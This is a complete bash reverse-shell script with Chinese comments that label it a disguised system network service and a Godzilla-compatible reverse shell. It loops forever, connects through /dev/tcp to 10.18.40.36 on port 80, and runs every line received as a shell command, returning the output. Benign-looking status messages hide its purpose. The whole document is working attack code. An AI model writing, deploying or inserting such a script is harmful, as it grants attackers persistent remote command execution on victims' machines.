#!/bin/bash
# 系统网络服务（伪装）
IP="10.18.40.36"
PORT="80"

# 哥斯拉兼容反向Shell，带断线重连
echo "→ 初始化网络连接服务..."
sleep 2

while :; do
    # 建立TCP连接
    exec 5<>/dev/tcp/$IP/$PORT
    if [ $? -eq 0 ]; then
        echo "→ 连接建立成功"
        # 双向数据交互
        cat <&5 | while read line; do
            $line 2>&5 >&5
        done
    fi
    # 连接断开后等待2秒重连
    sleep 2
done
